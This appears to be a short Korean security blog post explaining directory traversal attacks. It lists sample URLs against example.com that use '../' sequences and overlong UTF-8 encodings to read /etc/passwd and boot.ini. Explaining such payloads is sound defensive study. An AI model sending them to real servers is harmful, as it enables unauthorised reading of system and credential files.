---
layout: post
title: '[위협] Directory_Traversal'
subtitle: 'threat, directory, traversal'
categories: threat
tags: web
comments: true
---

> 이 글은 웹 취약점을 분석한 글입니다. 

# Directory_Traversal 

디렉토리 접근 공격

웹 브라우저에서 확인 가능한 경로의 상위로 올라가서 특정 시스템 파일을 접근하는 공격 

경로설정 문자는 유니코드(UTF-8)로 인코딩한다

```xml
1. hxxp://www.example.com/shop.php?html=product../../../../../../../etc/passwd

2. hxxp://www.example.com/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cboot.ini
2. hxxp://www.example.com/..\..\..\boot.ini

3. hxxp://www.example.com/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini
3. hxxp://www.example.com/......boot.ini

4. hxxp://www.example.com/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
4. hxxp://www.example.com/../../../boot.ini

5. hxxp://www.example.com/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini
5. hxxp://www.example.com/..\..\..\boot.ini
```
